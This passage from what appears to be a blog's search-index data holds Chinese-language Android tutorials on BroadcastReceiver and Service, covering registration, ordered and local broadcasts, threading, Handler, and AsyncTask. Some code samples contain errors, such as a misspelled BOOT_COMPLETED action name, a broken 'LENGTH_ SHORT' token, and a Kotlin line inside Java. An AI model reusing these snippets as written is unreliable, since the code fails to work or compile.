由于 limit(3) 查询到的是前 3 条数据，这里我们再加上 offset(1) 进行一个位置的偏移，就能实现查询第 2 条、第 3 条、第 4 条数据的功能了。limit() 和 offset() 方法共同对应了 SQL 当中的 limit 关键字。","categories":[],"tags":[],"keywords":[]},{"title":"Andriod-development-BroadcastReceiver","slug":"Andriod-development-BroadcastReceiver","date":"2024-09-21T01:00:43.000Z","updated":"2024-11-11T09:24:40.865Z","comments":true,"path":"2024/09/21/Andriod-development-BroadcastReceiver/","link":"","permalink":"http://example.com/2024/09/21/Andriod-development-BroadcastReceiver/","excerpt":"","text":"什么是 BroadcastReceiver在 Android 中，BroadcastReceiver 是一种用于接收和处理广播事件的组件。广播是一种 Android 应用之间传递消息的方式，适合在应用之间共享事件，或在系统状态发生变化时通知应用。例如，当设备启动完成、连接到 Wi-Fi、接收到短信等，系统会发送相应的广播消息，而应用可以通过 BroadcastReceiver 来监听这些事件。它的工作原理是基于发布-订阅模式。应用程序可以选择注册感兴趣的广播消息，并在消息到达时进行响应。这种机制使得不同的应用程序之间能够实现通信和协作，同时也提供了一种系统级别的事件通知机制。 标准广播和有序广播标准广播 （Normal broadcasts）是一种完全异步执行的广播，在广播发出之后，所有的广播接收器几乎都会在同一时刻接收到这条广播消息，因此它们之间没有任何先后顺序可言。这种广播的效率会比较高，但同时也意味着它是无法被截断的。 有序广播 （Ordered broadcasts）则是一种同步执行的广播，在广播发出之后，同一时刻只会有一个广播接收器能够收到这条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。所以此时的广播接收器是有先后顺序的，优先级高的广播接收器就可以先收到广播消息，并且前面的广播接收器还可以截断正在传递的广播，这样后面的广播接收器就无法收到广播消息了。 静态注册和动态注册不同于其他三大组件，广播接收器既可以在 AndroidManifest.xml 中进行静态注册，也可以在代码中进行动态注册。 静态注册 静态注册 是在 AndroidManifest.xml 文件中声明 BroadcastReceiver，并定义其要监听的广播类型。这种方式适合用于监听 系统广播 和一些全局广播事件。 静态注册的广播接收器与设备共存亡，可以让应用在未运行时也能接收到广播消息。适合需要在应用未启动时也能接收到的广播事件，比如设备启动完成、安装应用等。 在设备重启后，静态注册的广播可以继续监听指定事件，而不需要重新注册。 实现方法 在 AndroidManifest.xml 中声明一个 &lt;receiver&gt; 元素，并定义广播接收器及其要监听的广播事件。 静态注册的限制从 Android 8.0（API 级别 26） 开始，系统对静态广播的注册有所限制，某些广播事件只能使用 动态注册 监听，例如 CONNECTIVITY_ACTION（网络状态变化）。这些事件只能在应用运行时注册和接收，避免消耗设备资源。 动态注册 动态注册 是通过在代码中使用 registerReceiver() 方法注册 BroadcastReceiver。通常在 Activity 或 Service 等组件的生命周期内注册和注销广播接收器。并在适当的时候调用 unregisterReceiver() 方法进行解注册。 动态注册的广播接收器与注册它的 Activity 共存亡，只有当应用处于运行状态时，接收器才会接收到广播消息。适合在组件的特定生命周期内监听广播事件，例如在 Activity 显示期间监听网络变化，停止后不再监听。对于 Android 8.0 以上版本受限制的广播事件，必须使用动态注册。 实现方法 在代码中创建并注册 BroadcastReceiver，当不需要监听时，通过 unregisterReceiver() 取消注册。 静态注册和动态注册的对比 特性 静态注册 动态注册 注册方式 在 AndroidManifest.xml 中声明 在代码中使用 registerReceiver() 生命周期 生命周期与应用一致，可在应用未启动时接收广播 生命周期与组件（如 Activity）一致，需在适当时取消 使用场景 适合全局广播，特别是系统启动广播等 适合在应用运行期间临时监听的广播，例如网络状态变化 受 Android 8.0+ 限制 部分广播受限制，需改用动态注册 不受限制，可以正常使用 内存消耗 长时间监听，可能消耗资源 生命周期内监听，合理控制内存消耗 BroadcastReceiver 的基本使用静态注册接收开机广播首先创建一个 BootCompleteReceiver 类，重写 onReceive() 方法，使用 Toast 弹出一段提示信息。 12345678public class BootCompleteReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; Toast.makeText(context, &quot;Boot Complete&quot;, Toast.LENGTH_LONG).show(); &#125;&#125; 因为是静态注册，所以需要在 AndroidManifest.xml 文件中进行注册 12345&lt;receiver android:name=&quot;.BootCompleteReceiver&quot;&gt; &lt;intent-filter&gt; &lt;action android:name = &quot;android.intent.cation.BOOT_COMPLETED&quot;&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 由于 Android 系统启动完成后会发出一条值为 android.intent.action.BOOT_COMPLETED 的广播，因此我们在 &lt;intent-filter&gt; 标签里添加了相应的 action。 除此之外，还要给应用添加权限。 1&lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt; 主活动中不需要添加任何代码。 动态注册监听网络状态变化以监听网络变化为例，讲解如何动态注册广播接收者。 首先我们需要创建一个 BroadcastReceiver 类，重写父类的 onReceive() 方法来实现网络变化后动作。 123456public class NetworkReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; Toast.makeText(context, &quot;network changes&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125; 然后再主活动中动态注册该广播接收者。 1234567891011121314151617181920212223public class MainActivity extends AppCompatActivity &#123; private NetworkReceiver networkReceiver; @Override protected void onCreate(@Nullable Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //实例化广播接收者 networkReceiver = new NetworkReceiver(); //添加意图为网络状态改变 IntentFilter intentFilter = new IntentFilter(); intentFilter.addAction(&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;); //使用 registerReceiver()动态注册广播接收者 registerReceiver(networkReceiver, intentFilter); &#125; @Override protected void onDestroy() &#123; super.onDestroy(); unregisterReceiver(networkReceiver); &#125;&#125; 当网络状态发生变化时，系统会发出一条值为 android.net.conn.CONNECTIVITY_CHANGE 的广播，因为我们的广播接收器需要监听这个广播，所以 action 就设置此值。 最后，不要忘记将广播接收器取消注册。动态注册的广播接收器与活动共存亡，所以重写活动的 onDestroy() 方法，调用 unregisterReceiver() 方法来实现。 发送自定义广播发送标准广播在发送广播前，我们仍然要定义一个广播接收器来接收我们发送的广播。 123456789public class MyBroadcastReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; Toast.makeText(context, &quot;received in MyBroadcastReceiver&quot;, Toast.LENGTH_ SHORT).show(); &#125;&#125; 在 AndroidManifest.xml 中进行注册。 12345678&lt;receiver android:name=&quot;.MyBroadcastReceiver&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;!--自定义一个动作--&gt; &lt;action android:name=&quot;com.example.broadcasttest.MY_BROADCAST&quot;/&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 接下来修改 activity_main.xml 中的代码，如下所示： 12345678910111213&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; &gt; &lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Send Broadcast&quot; /&gt;&lt;/LinearLayout&gt; MainActivity.java 代码 1234567891011121314151617public class MainActivity extends AppCompatActivity &#123; private NetworkReceiver networkReceiver; @Override protected void onCreate(@Nullable Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void sendBroadcast(View view) &#123; Intent intent = new Intent(&quot;com.example.broadcasttest.MY_BROADCAST&quot;); //SDK 版本 &gt; 26 需要添加 //intent.addFlags(0x01000000); sendBroadcast(intent); &#125;&#125; Android 8.0（API 级别 26）起，Android 引入了后台执行限制，以提高设备性能和安全性。这意味着在后台运行的应用程序将无法接收到大多数隐式广播，除非应用程序处于前台或具有前台服务。 发送有序广播另外创建一个项目，同样接收 com.example.broadcasttest.MY_BROADCAST 的广播消息，同样弹窗显示： 1234567public class MyReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; Toast.makeText(context, &quot;received in AnotherBroadcastReceiver&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125; 在 AndroidManifest.xml 中注册： 12345678&lt;receiver android:name=&quot;.AnotherBroadcastReceiver&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.example.broadcasttest.MY_BROADCAST&quot; /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; 然后将其安装到测试机上。 发送有序广播的代码在上 2.3.1 的基础上，只需要将 sendBroadcast(intnet) 方法改为 sendOrderedBroadcast(intent,receiverPermission ) 方法即可。其中参数 receiverPermission 是一个与权限有关的字符串，这里传入 null 就行了。 广播接收器的优先级既然有序广播在接收时是有先后顺序的，那么就我们可以设置广播接收器的先后顺序。在 AndroidManifest.xml 的 &lt;intent-filter&gt; 中，使用属性 android:priority 来设置优先级，值越大优先级越高，优先级越高的广播接收器就越先接收到广播。 截断广播传递既然已经获得了接收广播的优先权，那么我们就可以对这条广播进行截断了。操作起来比较容易，只需要在自定义的 BroadcastReceiver 类的 onReceive() 方法中添加 abortBroadcast() 方法即可，相关代码如下： 12345678public class MyBroadcastReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; Log.d(&quot;MyBroadcastReceiver&quot;, &quot;Received&quot;); Toast.makeText(context, &quot;MyBroadcastReceiver received&quot;, Toast.LENGTH_SHORT).show(); abortBroadcast(); &#125;&#125; 使用本地广播在前面的代码中，我们发送和接收的广播全部属于系统全局广播，即发出的广播可以被其他任何应用程序接收到，并且我们也可以接收来自于其他任何应用程序的广播。 但这样就很容易引起安全性的问题，比如说我们发送的一些携带关键性数据的广播有可能被其他的应用程序截获，或者其他的程序不停地向我们的广播接收器里发送各种垃圾广播。因此 Android 引入了一套本地广播机制来解决这些安全性问题，使用这个机制发出的广播只能够在应用程序的内部进行传递，并且广播接收器也只能接收来自本应用程序发出的广播。 本地广播的用法并不复杂，主要就是使用了一个 LocalBroadcastManager 来对广播进行管理，并提供了发送广播和注册广播接收器的方法。 在使用前，我们需要注意一些事项： 本地广播无法通过静态注册来接收。因为发送本地广播时，程序肯定已经启动了，没有必要用静态注册。况且静态注册的话，会接收到来自非自生应用程序的广播。 在广播中启动 Activity 的话，需要 Intent 中添加 FLAG_ACTIVITY_NEW_TASK 的 Flag，不然会报错，因为需要一个栈来存放新打开的 Activity。 如果通过广播来弹出 AlertDialog，需要设置对话框的类型为 TYPE_SYSTEM_ALERT。 自定义 BroadcastReceiver 类，代码： 1234567public class MyBroadcastReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; Log.d(&quot;MyBroadcastReceiver&quot;, &quot;Received&quot;); Toast.makeText(context, &quot;MyBroadcastReceiver received&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class MainActivity extends AppCompatActivity &#123; private static final String ACTION_MY_BROADCAST = &quot;com.example.broadcasttest.MY_BROADCAST&quot;; private LocalBroadcastManager localBroadcastManager; private MyBroadcastReceiver MyBroadcastReceiver; @Override protected void onCreate(@Nullable Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //获取实例 localBroadcastManager = LocalBroadcastManager.getInstance(this); //注册本地广播接收器 IntentFilter intentFilter = new IntentFilter(ACTION_MY_BROADCAST); MyBroadcastReceiver = new MyBroadcastReceiver(); localBroadcastManager.registerReceiver(MyBroadcastReceiver, intentFilter); &#125; public void sendBroadcast(View view) &#123; Intent intent = new Intent(ACTION_MY_BROADCAST); //intent.addFlags(0x01000000); //发送本地广播 localBroadcastManager.sendBroadcast(intent); &#125; @Override protected void onDestroy() &#123; super.onDestroy(); //记得要取消注册 localBroadcastManager.unregisterReceiver(MyBroadcastReceiver); &#125;&#125; 跟动态注册的代码没有很大的区别，只不过是通过 localBroadcastManager 来注册和销毁广播接收器","categories":[],"tags":[],"keywords":[]},{"title":"Andriod-development-service","slug":"Andriod-development-service","date":"2024-09-18T12:18:04.000Z","updated":"2024-11-11T09:24:34.244Z","comments":true,"path":"2024/09/18/Andriod-development-service/","link":"","permalink":"http://example.com/2024/09/18/Andriod-development-service/","excerpt":"","text":"什么是 Service服务（Service）是 Android 中实现程序后台运行的解决方案，去执行那些不需要和用户交互（不需要 UI 界面）而且还要求长期运行的任务。服务的运行不依赖于任何用户界面，即使程序被切换到后台，或者用户打开了另外一个应用程序，服务仍然能够保持正常运行。 需要在 AndroidManifest.xml 中进行注册，否则系统无法识别该 Service。通过 &lt;service&gt; 标签，我们可以设置 Service 的各种属性，如是否可被其他应用调用、运行进程等。 1234567891011&lt;!-- 启动状态的Service 声明 --&gt; &lt;service android:name=&quot;.MyStartService&quot; //指定Service的类名，例如.MyStartService指的是com.example.myapp.MyStartService类 android:enabled=&quot;true&quot; //指定Service是否可以被系统实例化，默认为true。 android:exported=&quot;false&quot; //指定Service是否可以被其他应用隐式调用。如果包含intent-filter，默认值为true，否则为false。 android:process=&quot;:remote&quot; //指定Service是否需要在单独的进程中运行。 android:isolatedProcess=&quot;false&quot;&gt; //置为true意味着服务会在一个特殊的进程下运行，与系统其他进程分开，并且没有自己的权限。 &lt;!-- 可以添加 intent-filter 来允许隐式启动 --&gt; &lt;!-- &lt;intent-filter&gt; --&gt; &lt;!-- &lt;action android:name=&quot;com.example.myapp.ACTION_START_SERVICE&quot; /&gt; --&gt; &lt;!-- &lt;/intent-filter&gt; --&gt; &lt;/service&gt; 但是，服务并不是运行在一个独立的进程当中的，而是依赖于创建服务时所在的应用程序进程。当某个应用程序进程被杀掉时，所有依赖于该进程的服务也会停止运行。 服务并不会自动开启线程，所有的代码都是默认运行在主线程当中的。也就是说，我们需要在服务的内部手动创建子线程，并在这里执行具体的任务，否则就有可能出现主线程被阻塞住的情况。 Service 的类型 启动的 Service（Started Service）： 通过 startService() 启动。 一旦启动，Service 会在后台独立运行，直到自己调用 stopSelf() 或外部调用 stopService()。 适合执行一次性任务，如下载或文件上传等。 绑定的 Service（Bound Service）： 通过 bindService() 与一个组件（如 Activity）绑定。 当所有绑定的组件解除绑定后，Service 会自动停止。 适合用于长时间运行的服务，并且需要与其他组件交互（如 Activity 获取数据等）。 前台 Service（Foreground Service）： 显示一个通知以提升优先级，避免因内存不足而被系统回收。 适合需要用户持续关注的任务，如音乐播放或位置跟踪等。 多线程编程线程的基本用法定义一个线程只需要新建一个类继承自 Thread，然后重写父类的 run() 方法，并在里面编写我们想要处理的事务的逻辑即可， new 出 MyThread 的实例，然后调用它的 start() 方法，这样 run() 方法中的代码就会在子线程当中运行了 1234567class MyThread extends Thread&#123; @Override public void run()&#123; //处理事务的具体逻辑 &#125;&#125;new MyThread().start(); 使用实现 Runnable 接口的方式来定义一个线程 12345678class MyThread implements Runnable&#123; @Override public void run() &#123; //处理事务的具体逻辑 &#125;&#125;val myThread = MyThread() new Thread(new MyThread()).start();//启动 Thread 的构造函数接收一个 Runnable 参数，而我们 new 出的 MyThread 正是一个实现了 Runnable 接口的对象，所以可以直接将它传入到 Thread 的构造函数里。接着调用 Thread 的 start() 方法，run() 方法中的代码就会在子线程当中运行了。 使用匿名类的方式 12345678new Thread(new Runnable() &#123; @Override public void run() &#123; // 处理具体的逻辑 &#125;&#125;).start(); 在子线程中更新 UI想要更新应用程序里的 UI 元素，必须在主线程中进行，否则就会出现异常。 新建一个 AndroidThreadTest 项目，然后修改 activity_main.xml 中的代码，如下所示 12345678910111213141516171819&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:id=&quot;@+id/change_text&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Change Text&quot; /&gt; &lt;TextView android:id=&quot;@+id/text&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_centerInParent=&quot;true&quot; android:text=&quot;Hello world&quot; android:textSize=&quot;20sp&quot; /&gt;&lt;/RelativeLayout&gt; 定义了两个控件：TextView 用于在屏幕的正中央显示一个 “Hello world” 字符串； Button 用于改变 TextView 中显示的内容，我们希望在点击“Button”后可以把 TextView 中显示的字符串改成 “Nice to meet you” MainActivity 中的代码 123456789101112131415161718192021222324252627282930public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123; private TextView text; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); text = (TextView) findViewById(R.id.text); Button changeText = (Button) findViewById(R.id.change_text); changeText.setOnClickListener(this); &#125; @Override public void onClick(View v) &#123; switch (v.getId()) &#123; case R.id.change_text: new Thread(new Runnable() &#123; @Override public void run() &#123; text.setText(&quot;Nice to meet you&quot;); &#125; &#125;).start(); break; default: break; &#125; &#125;&#125; 我们在“Change Text”按钮的点击事件里面开启了一个子线程，然后在子线程中调用 TextView 的 setText()方法将显示的字符串改成 “Nice to meet you”。代码的逻辑非常简单，只不过我们是在子线程中更新 UI 的。现在运行一下程序，并点击“Change Text”按钮，你会发现程序果然崩溃了。观察 Logcat 中的错误日志，可以看出是由于在子线程中更新 UI 所导致的 1android.view.ViewRootImpl$CalledFromWrongThreadException:Only the original thread that created a view hierarchy can touch its views. 由此证实了 Android 确实是不允许在子线程中进行 UI 操作的。但是有些时候，我们必须在子线程里去执行一些耗时任务，然后根据任务的执行结果来更新相应的 UI 控件，那这该怎么办呢？ 对于这种情况，Android 提供了一套异步消息处理机制，完美地解决了在子线程中进行 UI 操作的问题。我们先来学习一下异步消息处理的使用方法。 修改 MainActivity 中的代码，如下所示： 1234567891011121314151617181920212223242526272829303132333435public class MainActivity extends AppCompatActivity &#123; private static final int UPDATE_TEXT = 1; private Handler handler = new Handler()&#123; public void handleMessage(Message msg)&#123; switch (msg.what)&#123; case UPDATE_TEXT: TextView textView = findViewById(R.id.id_text); textView.setText(&quot;aaaaaaaaaaa&quot;); break; default: break; &#125; &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void ClickChangeUI(View view) &#123; new Thread(new Runnable() &#123; @Override public void run() &#123; Message message = new Message(); message.what = UPDATE_TEXT; handler.sendMessage(message); &#125; &#125;).start(); &#125;&#125; 这里我们先是定义了一个整型常量 UPDATE_TEXT，用于表示更新 TextView 这个动作。然后新增一个 Handler 对象，并重写父类的 handleMessage() 方法，在这里对具体的 Message 进行处理。如果发现 Message 的 what 字段的值等于 UPDATE_TEXT，就更改 TextView 的内容。 接下来是按钮的点击事件中的代码。可以看到，这次我们并没有在子线程里直接进行 UI 操作，而是创建了一个 Message（android.os.Message）对象，并将它的 what 字段的值指定为 UPDATE_TEXT，然后调用 Handler 的 sendMessage() 方法将这条 Message 发送出去。很快，Handler 就会收到这条 Message，并在 handleMessage() 方法中对它进行处理。注意 此时 handleMessage() 方法中的代码就是在主线程当中运行的了，所以我们可以放心地在这里进行 UI 操作。 现在重新运行程序并点击按钮，发现程序并没有崩溃，而且 TextView 中的内容更改了。 现在可以说我们了解了 Android 异步消息处理的基本用法，但是我们并不了解它的工作原理，因此下面我们就来分析一下 Android 异步消息处理机制到底是如何工作的。 解析异步消息处理机制Android 中的异步消息处理主要由 4 个部分组成：Message、Handler、MessageQueue 和 Looper。 MessageMessage 是在 线程之间传递的消息，它可以在内部携带少量的信息，用于在不同线程之间交换数据。上一小节中我们使用到了 Message 的 what 字段，除此之外还可以使用 arg1 和 arg2 字段来携带一些整型数据，使用 obj 字段携带一个 Object 对象。 HandlerHandler 顾名思义也就是处理者的意思，它主要是用于发送和处理消息的。发送消息一般是使用 Handler 的 sendMessage() 方法，而发出的消息经过一系列地辗转处理后，最终会传递到 Handler 的 handleMessage() 方法中。 MessageQueueMessageQueue 是消息队列的意思，它主要用于存放所有通过 Handler 发送的消息。这部分消息会一直存在于消息队列中，等待被处理。每个线程中只会有一个 MessageQueue 对象。 LooperLooper 是每个线程中的 MessageQueue 的管家，调用 Looper 的 Loop() 方法后，就会进入到一个无限循环当中，然后每当发现 MessageQueue 中存在一条消息，就会将它取出，并传递到 Handler 的 handleMessage() 方法中。每个线程中也只会有一个 Looper 对象。 了解了 Message、Handler、MessageQueue 以及 Looper 的基本概念后，我们再来把异步消息处理的整个流程梳理一遍。 首先需要在主线程当中创建一个 Handler 对象，并重写 handleMessage() 方法。然后当子线程中需要进行 UI 操作时，就创建一个 Message 对象，并通过 Handler 将这条消息发送出去。之后这条消息会被添加到 MessageQueue 的队列中等待被处理，而 Looper 则会一直尝试从 MessageQueue 中取出待处理消息，最后分发回 Handler 的 handleMessage() 方法中。由于 Handler 是在主线程中创建的，所以此时 handleMessage() 方法中的代码也会在主线程中运行，于是我们在这里就可以安心地进行 UI 操作了。整个异步消息处理机制的流程示意图如图所示： 一条 Message 经过这样一个流程的辗转调用后，也就从子线程进入到了主线程，从不能更新 UI 变成了可以更新 UI，整个异步消息处理的核心思想也就是如此。 使用 AsyncTask不过为了更加方便我们在子线程中对 UI 进行操作，Android 还提供了另外一些好用的工具，比如 AsyncTask。借助 AsyncTask，即使你对异步消息处理机制完全不了解，也可以十分简单地从子线程切换到主线程。当然，AsyncTask 背后的实现原理也是基于异步消息处理机制的，只是 Android 帮我们做了很好的封装而已。 首先来看一下 AsyncTask 的基本用法，由于 AsyncTask 是一个抽象类，所以如果我们想使用它，就必须要创建一个子类去继承它。在继承时我们可以为 AsyncTask 类指定 3 个泛型参数，这 3 个参数的用途如下： Params 在执行 AsyncTask 时需要传入的参数，可用于在后台任务中使用。 Progress 后台任务执行时，如果需要在界面上显示当前的进度，则使用这里指定的泛型作为进度单位。 Result 当任务执行完毕后，如果需要对结果进行返回，则使用这里指定的泛型作为返回值类型。 因此，一个最简单的自定义 AsyncTask 就可以写成如下方式： 123class DownloadTask extends AsyncTask&lt;Void, Integer, Boolean&gt;&#123; ......&#125; 这里我们把 AsyncTask 的第一个泛型参数指定为 Void，表示在执行 AsyncTask 的时候不需要传入参数给后台任务。第二个泛型参数指定为 Integer，表示使用整型数据来作为进度显示单位。第三个泛型参数指定为 Boolean，则表示使用布尔型数据来反馈执行结果。 当然，目前我们自定义的 DownloadTask 还是一个空任务，并不能进行任何实际的操作，我们还需要去重写 AsyncTask 中的几个方法才能完成对任务的定制。经常需要去重写的方法有以下 4 个： onPreExecute()这个方法会在后台任务开始执行之前调用，用于进行一些界面上的初始化操作，比如显示一个进度条对话框等。 doInBackground (Params…)这个方法中的所有代码都会在子线程中运行，我们应该 在这里去处理所有的耗时任务。任务一旦完成就可以通过 return 语句来将任务的执行结果返回，如果 AsyncTask 的第三个泛型参数指定的是 Void, 就可以不返回任务执行结果。注意，在这个方法中是 不可以进行 UI 操作的，如果需要更新 UI 元素，比如说反馈当前任务的执行进度，可以调用 publishProgress(Progress...) 方法来完成。 onProgressUpdate(Progress…)当在后台任务中调用了 publishProgress(Progress...) 方法后，onProgressUpdate(Progress...) 方法就会很快被调用，该方法中携带的参数就是在后台任务中传递过来的。在这个方法中 可以对 UI 进行操作，利用参数中的数值就可以对界面元素进行相应的更新。 onPostExecute(Result)当后台任务执行完毕并通过 return 语句进行返回时，这个方法就很快会被调用。返回的数据会作为参数传递到此方法中，可以利用返回的数据来进行一些 UI 操作，比如说提醒任务执行的结果，以及关闭掉进度条对话框等。 因此，一个比较完整的自定义 AsyncTask 就可以写成如下方式： 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class DownloadTask extends AsyncTask&lt;Void, Integer, Boolean&gt; &#123; protected void onPreExecute()&#123; //显示进度对话框 progressDialog.show(); &#125; @Override protected Boolean doInBackground(Void... params) &#123; //任务处理 try &#123; while (true)&#123; int downloadPercent = doDownload();//虚构方法 publishProgress(downloadPercent); if (downloadPercent &gt;= 100)&#123; break; &#125; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); return false; &#125; return true; &#125; @Override protected void onProgressUpdate(Integer... values) &#123; super.onProgressUpdate(values); //UI 跟新，即更新下载进度 progressDialog.setMessage(&quot;Downloaded &quot; + values[0] + &quot;%&quot;); &#125; @Override protected void onPostExecute(Boolean result) &#123;//任务执行完后被调用 super.onPostExecute(result); //关闭进度对话框 progressDialog.dismiss(); //提示下载结果 if (result)&#123; Toast.makeText(context, &quot;Download succeeded&quot;, Toast.LENGTH_SHORT).show(); &#125; else &#123; Toast.makeText(context, &quot;Download failed&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125;&#125; 在这个 DownloadTask 中，我们在 doInBackground() 方法里去执行具体的下载任务。这个方法里的代码都是在子线程中运行的，因而不会影响到主线程的运行。注意这里虚构了一个 doDownload() 方法，这个方法用于计算当前的下载进度并返回，我们假设这个方法已经存在了。在得到了当前的下载进度后，下面就该考虑如何把它显示到界面上了，由于 doInBackground() 方法是在子线程中运行的，在这里肯定不能进行 UI 操作，所以我们可以调用 publishProgress() 方法并将当前的下载进度传进来，这样 onProgressUpdate() 方法就会很快被调用，在这里就可以进行 UI 操作了。当下载完成后，doInBackground() 方法会返回一个布尔型变量，这样 onPostExecute() 方法就会很快被调用，这个方法也是在主线程中运行的。然后在这里我们会根据下载的结果来弹出相应的 Toast 提示，从而完成整个 DownloadTask 任务。 简单来说，使用 AsyncTask 的诀窍就是，在 doInBackground() 方法中执行具体的耗时任务，在 onProgressUpdate() 方法中进行 UI 操作，在 onPostExecute() 方法中执行一些任务的收尾工作。 如果想要启动这个任务，只需编写以下代码即可： 1new DownloadTask().execute(); 以上就是 AsyncTask 的基本用法。从上面这个例子中，可以看出，我们并不需要去考虑什么异步消息处理机制，也不需要专门使用一个 Handler 来发送和接收消息，只需要调用一下 publishProgress() 方法，就可以轻松地从子线程切换到 UI 线程了。 Service 的生命周期 **onCreate()**：当 Service 第一次被创建后立即回调该方法，该方法在整个生命周期中只会调用一次！ **onDestory()**：当 Service 被关闭时会回调该方法，该方法只会回调一次！ onStartCommand(intent, flag, startId)*：可多次调用 StartService 方法， 但不会再创建新的 Service 对象，而是继续复用前面产生的 Service 对象，* 但会继续回调 onStartCommand()方法。 onbind(intent)*：该方法是 Service 都必须实现的方法，该方法会返回一个 IBinder 对象，* app 通过该对象与 Service 组件进行通信！ onUnbind(intent)*：当该 Service 上绑定的* 所有客户端都断开 时会回调该方法！ **stopSelf()**：Service 自身调用，用于关闭服务。 两种启动方式启动模式（Started Service）当调用 startService() 方法启动 Service 时，它会以 启动模式 运行，适合执行单次任务，如播放音乐、下载文件等。在这种模式下，Service 会一直运行，直到手动调用 stopSelf() 或 stopService() 方法将其停止。系统对同一个 Service 只会创建一个 Service 实例。如果 Service 实例不存在，调用 startService() 方法则会实例化一个 Service 对象，否则复用之前创建的 Service 实例。 启动模式生命周期方法： **onCreate()**： 当 Service 第一次启动时调用。 在 Service 的整个生命周期内只调用一次。 用于初始化资源，如创建线程、初始化服务所需的对象等。 **onStartCommand(Intent intent, int flags, int startId)**： 每次通过 startService() 启动 Service 时都会调用。 处理启动服务的任务逻辑，适合执行持续或定时的后台任务。 返回值 决定了当系统杀掉 Service 时的行为： **START_NOT_STICKY**：系统不会重启该 Service。 **START_STICKY**：系统会尝试重新创建 Service，但不会重新传递 Intent。 **START_REDELIVER_INTENT**：系统会重新启动 Service 并重新传递最后一个 Intent。 **onDestroy()**： 当 Service 被销毁时调用。 用于清理资源、关闭线程或保存数据等，确保系统释放不再使用的资源。 绑定模式（Bound Service）当调用 bindService() 将 Service 与 Activity 绑定时，它会以 绑定模式 运行，适合执行一些客户端和服务端交互的任务，例如获取位置服务、音频控制等。绑定模式的 Service 生命周期依赖于绑定的客户端数量，所有客户端解除绑定后 Service 会自动销毁。当 Service 只与一个客户端绑定时，调用 unbindService() 或者调用者退出，Service 会被销毁。当 Service 与多个客户端绑定时，只有与所有客户端取消绑定后，Service 才会被销毁。系统对同一个 Service 只会创建一个 Service 实例。如果 Service 实例不存在，调用 bindService 则会实例化一个 Service 对象，否则复用之前创建的 Service 实例。 绑定模式生命周期方法 ： **onCreate()**： 当 Service 第一次启动时调用，与启动模式相同。 用于初始化 Service 所需的资源。 **onBind(Intent intent)**： 当客户端（如 Activity）调用 bindService() 绑定 Service 时调用。 返回一个 IBinder 对象，用于客户端与 Service 交互。 如果 Service 允许绑定多个客户端，则该方法可能会被多次调用。 **onUnbind(Intent intent)**： 当客户端调用 unbindService() 解除绑定时调用。 当所有客户端都解绑时，Service 会自动销毁。 若 onUnbind() 返回 true，表示支持重新绑定，系统会在下次绑定时调用 onRebind()。 **onRebind(Intent intent)**： 当已经调用了 onUnbind() 后，又有新的客户端绑定 Service 时调用。 适用于需要重新执行某些逻辑的场景。 **onDestroy()**： 当 Service 不再需要或所有客户端解除绑定后自动销毁。 用于清理资源、关闭线程等操作。 3. 同时使用启动模式和绑定模式在某些情况下，Service 可能需要同时支持启动和绑定模式。例如，音频播放服务可能既需要在用户按下播放按钮时启动，也需要在用户界面上绑定以更新播放状态。 混合模式特点： Service 只在 startService() 或 bindService() 调用时创建。 Service 的生命周期会在最后一个客户端解绑或调用 stopService() 后终止。 若在绑定模式下启动了 Service，但未使用 unbindService() 解绑或调用 stopService()，则 Service 会一直运行。 Service 的基本用法创建一个服务在项目中右键包名 → New → Service → Service，在弹出的对话框中，需要我们给服务命名，同时还有两个属性，Exported 属性表示是否允许除了当前程序之外的其他程序访问这个服务，Enabled 属性表示是否启用这个服务。将两个属性都勾中，点击 Finish 完成创建。这样创建的服务，会自动在 AndroidManifest.xml 中进行声明，如下所示： 1234567891011121314&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt; &lt;application ...... &gt; &lt;service android:name=&quot;.MyService&quot; 